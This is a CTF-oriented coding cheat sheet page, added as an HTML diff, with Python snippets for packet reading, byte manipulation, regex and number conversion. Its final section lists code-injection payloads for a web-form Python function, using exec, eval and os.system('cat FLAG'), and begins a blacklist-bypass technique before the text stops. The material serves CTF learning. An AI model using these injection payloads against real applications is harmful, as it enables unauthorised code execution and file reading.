@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-R21NVEB2EY');
+    </script>
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coding Quick Reference &mdash; tech.bitvijays.com 2.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script src="../_static/documentation_options.js?v=51b770b3"></script>
+        <script src="../_static/doctools.js?v=888ff710"></script>
+        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+        <script src="../_static/debug.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Electrical Grid" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html" />
+    <link rel="prev" title="Cryptography" href="LFC-Cryptography.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            tech.bitvijays.com
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html">Appendix</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="LFC-BinaryExploitation.html">Binary Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-Forensics.html">Forensics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-ReverseEngineering.html">Reverse Engineering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-Cryptography.html">Cryptography</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Coding Quick Reference</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#python">Python</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#scapy">SCAPY</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#read-pcap">Read PCAP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#read-write-file">Read/Write File</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#patterns">Patterns</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#numpy">Numpy</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#random-seed">Random Seed</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#beautifulsoup">BeautifulSoup</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#pwntools">PwnTools</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#installing-pwntools">Installing Pwntools</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#verifying-installation">Verifying Installation</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#foreign-architectures">Foreign Architectures</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#tubes">Tubes</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#basic-io">Basic IO</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#processes-and-basic-features">Processes and Basic Features</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#interactive-sessions">Interactive Sessions</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#networking">Networking</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#secure-shell">Secure Shell</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#serial-ports">Serial Ports</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#id1">Util.fiddling</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#pwn-templates">Pwn Templates</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#ctypes">ctypes</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#php">PHP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#burpsuite">BurpSuite</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#generating-wordlists">Generating Wordlists</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#cewl">cewl</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#crunch">crunch</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#c-programming">C Programming</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#functions">Functions</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#randomization">Randomization</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#rand">rand</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#srand">srand</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#read">Read</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#fgets">fgets</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#data-conversion">Data conversion</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#hex">Hex</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#hex-from-little-endian-to-big-endian">Hex from little endian to big-endian</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#hex-to-ascii">Hex to ASCII</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">tech.bitvijays.com</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Coding Quick Reference</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="coding-quick-reference">
+<h1>Coding Quick Reference<a class="headerlink" href="#coding-quick-reference" title="Link to this heading"></a></h1>
+<section id="python">
+<h2>Python<a class="headerlink" href="#python" title="Link to this heading"></a></h2>
+<section id="scapy">
+<h3>SCAPY<a class="headerlink" href="#scapy" title="Link to this heading"></a></h3>
+<section id="read-pcap">
+<h4>Read PCAP<a class="headerlink" href="#read-pcap" title="Link to this heading"></a></h4>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s2">&quot;/spare/captures/isakmp.cap&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="read-write-file">
+<h4>Read/Write File<a class="headerlink" href="#read-write-file" title="Link to this heading"></a></h4>
+<p>The below code reads a file from a particular offset and reads/skips and write bytes.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="sd">&quot;&quot;&quot; Read bytes and write output&quot;&quot;&quot;</span>
+
+
+<span class="c1"># Write output in a file</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;output.data&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+
+<span class="c1"># Open a file</span>
+<span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="s2">&quot;output.bmp&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+    <span class="c1"># Start reading from</span>
+    <span class="n">hdr</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x8a</span><span class="p">)</span>
+    <span class="n">skip</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">skip</span><span class="p">:</span>
+        <span class="n">keep</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">keep</span><span class="p">)</span>
+        <span class="n">skip</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="patterns">
+<h4>Patterns<a class="headerlink" href="#patterns" title="Link to this heading"></a></h4>
+<p>A file might contains few patterns representing binary (0 &amp; 1). pwnutils can be used to read the file and replace the patterns.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;whitepages.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">bin_file</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">bin_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xe2\x80\x83</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x20</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;ascii&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">unbits</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="numpy">
+<h3>Numpy<a class="headerlink" href="#numpy" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://numpy.org/doc/stable/reference/generated/numpy.unique.html">numpy.unique</a>: Find the unique elements of an array.</p></li>
+<li><p><a class="reference external" href="https://numpy.org/doc/stable/reference/generated/numpy.ndarray.astype.html">numpy.ndarray.astype</a>: Copy of the array, cast to a specified type.</p></li>
+<li><p><a class="reference external" href="https://numpy.org/doc/stable/reference/generated/numpy.argmax.html">numpy.argmax</a>: Returns the indices of the maximum values along an axis.</p></li>
+</ul>
+<section id="random-seed">
+<h4>Random Seed<a class="headerlink" href="#random-seed" title="Link to this heading"></a></h4>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># seed a pseudorandom number generator with the time</span>
+<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">()))</span>
+</pre></div>
+</div>
+<p>The random number generator in the original script was seeded with the time, but only to the second. If the above is used in sending the packets.
+The arrival time for the first packet should be close enough of an approximation to get the same seed (if not, I could subtract a few seconds until it works).</p>
+<p>Use python</p>
+<ul>
+<li><p>[::-1] means</p>
+<p>Assumming a is a string. The Slice notation in python has the syntax -</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">list</span><span class="p">[</span><span class="o">&lt;</span><span class="n">start</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">stop</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">step</span><span class="o">&gt;</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>So, when you do a[::-1] , it starts from the end, towards the first, taking each element. So it reverses a. This is applicable for lists/tuples as well.</p>
+<p>Example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;1232&#39;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="go">&#39;2321&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>binascii.unhexlify(hexstr) to convert hex to string</p></li>
+<li><p>base64.decodestring(str) to decode base64 string</p></li>
+<li><p>Convert number to hex</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">hex</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+<span class="s1">&#39;0xf&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Convert hex to decimal</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;6a48f82d8e828ce82b82&quot;</span>
+<span class="n">i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Extract numbers from a string: Use a regexp :</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">re</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\d+&#39;</span><span class="p">,</span> <span class="s1">&#39;hello 42 I</span><span class="se">\&#39;</span><span class="s1">m a 32 string 30&#39;</span><span class="p">)</span>
+<span class="go">[&#39;42&#39;, &#39;32&#39;, &#39;30&#39;]</span>
+</pre></div>
+</div>
+<p>This would also match 42 from bla42bla. If you only want numbers delimited by word boundaries (space, period, comma), you can use b :</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\b\d+\b&#39;</span><span class="p">,</span> <span class="s1">&#39;he33llo 42 I</span><span class="se">\&#39;</span><span class="s1">m a 32 string 30&#39;</span><span class="p">)</span>
+<span class="go">[&#39;42&#39;, &#39;32&#39;, &#39;30&#39;]</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Extract string inside single quotes using python script</p></li>
+</ul>
+<blockquote>
+<div><p>Use re.findall:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">re</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">strs</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;text:u&#39;MUC-EC-099_SC-Memory-01_TC-25&#39;</span>
+<span class="go">             text:u&#39;MUC-EC-099_SC-Memory-01_TC-26&#39;</span>
+<span class="go">          text:u&#39;MUC-EC-099_SC-Memory-01_TC-27&#39;&quot;&quot;&quot;</span>
+
+<span class="gp">&gt;&gt;&gt; </span><span class="s2">re.findall(r&quot;&#39;(.*?)&#39;&quot;, strs, re.DOTALL)</span>
+<span class="go">[&#39;MUC-EC-099_SC-Memory-01_TC-25&#39;,</span>
+<span class="go"> &#39;MUC-EC-099_SC-Memory-01_TC-26&#39;,</span>
+<span class="go"> &#39;MUC-EC-099_SC-Memory-01_TC-27&#39;</span>
+<span class="go">]</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>ASCII value of a character in Python</p></li>
+</ul>
+<blockquote>
+<div><p>function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="go">97</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Solving Algebraic equations using python: Use sympy
+Use solve() to solve algebraic equations. We suppose all equations are equaled to 0, so solving x**2 == 1 translates into the following code:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">sympy.solvers</span> <span class="kn">import</span> <span class="n">solve</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">Symbol</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span> <span class="o">=</span> <span class="n">Symbol</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">solve</span><span class="p">(</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+<span class="go">[-1, 1]</span>
+</pre></div>
+</div>
+<p>The first argument for solve() is an equation (equaled to zero) and the second argument is the symbol that we want to solve the equation for.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>AVL Tree Implementation in Python : <a class="reference external" href="https://github.com/pgrafov/python-avl-tree">python-avl-tree</a></p></li>
+<li><p>Convert all strings in a list to int
+So if we have:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">results</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>How do I make it:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">results</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
+
+
+<span class="n">Use</span> <span class="n">the</span> <span class="nb">map</span> <span class="n">function</span><span class="p">(</span><span class="ow">in</span> <span class="n">py2</span><span class="p">):</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">results</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">results</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>In py3:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">results</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">results</span><span class="p">))</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Read the RGB value of a given pixel in Python?</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;dead_parrot.jpg&quot;</span><span class="p">)</span> <span class="c1">#Can be many different formats.</span>
+<span class="n">pix</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+<span class="nb">print</span> <span class="n">im</span><span class="o">.</span><span class="n">size</span> <span class="c1">#Get the width and hight of the image for iterating over</span>
+<span class="nb">print</span> <span class="n">pix</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="c1">#Get the RGBA Value of the a pixel of an image</span>
+<span class="n">pix</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span> <span class="c1"># Set the RGBA Value of the image (tuple)</span>
+<span class="n">im</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&quot;alive_parrot.png&quot;</span><span class="p">)</span> <span class="c1"># Save the modified pixels as png</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>Convert Text to Binary and back?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">binascii</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
+<span class="go">&#39;0b110100001100101011011000110110001101111&#39;</span>
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>In reverse:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s1">&#39;0b110100001100101011011000110110001101111&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">n</span><span class="p">)</span>
+<span class="go">&#39;hello&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>function ord() would get the int value of the char. And in case you want to convert back after playing with the number, function chr() does the trick.</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="go">97</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span>
+<span class="go">&#39;a&#39;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
+<span class="go">&#39;d&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>String formating of numbers in python (Print 0000 - 9999)</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+<span class="gp">... </span>    <span class="s1">&#39;</span><span class="si">{0:04}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="gp">...</span>
+<span class="go">&#39;0000&#39;</span>
+<span class="go">&#39;0001&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Insert a newline character every 64 characters using Python</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;0123456789&quot;</span><span class="o">*</span><span class="mi">100</span> <span class="c1"># test string</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="nb">print</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s2">&quot;(.</span><span class="si">{64}</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">1</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>Having a function where you can provide parameter in online webform? Like there is a function definition like def fun() where we can pass two arguments, that are interpreted.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">fun</span><span class="p">(</span><span class="n">User_Input</span><span class="p">):</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
+        <span class="k">return</span> <span class="n">c</span>
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>Try</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>1.   a,b=dir()[0]
+2.   a,b=print(&quot;Hello&quot;)
+3.   a,b=print(exec(&quot;import os&quot;),eval(&quot;os.listdir(&#39;.&#39;)&quot;))
+
+Cat a file?
+
+1.   a, b, c = __import__(&#39;os&#39;).system(&#39;cat FLAG&#39;)
+2.   a,b=print(open(&quot;FLAG&quot;, &quot;r&quot;).read())
+</pre></div>
+</div>
+<p>The above should work fine till there are no blacklist wordlist provided.</p>
+<p>Let’s craft a payload to bypass the blacklist.</p>
+<p>Create a string class (also works with list or dict)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span>
+<span class="go">&lt;class &#39;str&#39;&gt;</span>
+</pre></div>
+</div>
+<p>Now we need the parent class, there is two ways:</p>
